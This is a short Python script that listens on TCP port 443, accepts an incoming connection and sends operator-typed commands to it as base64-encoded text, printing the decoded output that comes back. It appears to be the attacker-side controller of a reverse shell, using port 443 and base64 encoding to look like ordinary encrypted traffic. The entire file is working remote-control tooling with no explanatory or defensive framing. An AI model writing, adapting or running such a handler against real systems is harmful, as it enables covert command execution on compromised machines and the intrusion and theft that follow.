#!/usr/bin/env python3
import base64
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 443))
s.listen(2)

print("[+] Listening on port 443 ...")

(client, (ip, port)) = s.accept()

print("[+] Received connection from: {0}".format(ip))

while True:
    command = input('~$ ')

    byte_encode = base64.b64encode(bytes(command, 'big5'))
    client.send(byte_encode)

    # received data as byte
    en_data = client.recv(2048)

    # show on screen (decode bytearray object to string)
    recev_byte = base64.b64decode(en_data)
    print(recev_byte.decode('big5'))

client.close()
s.close()
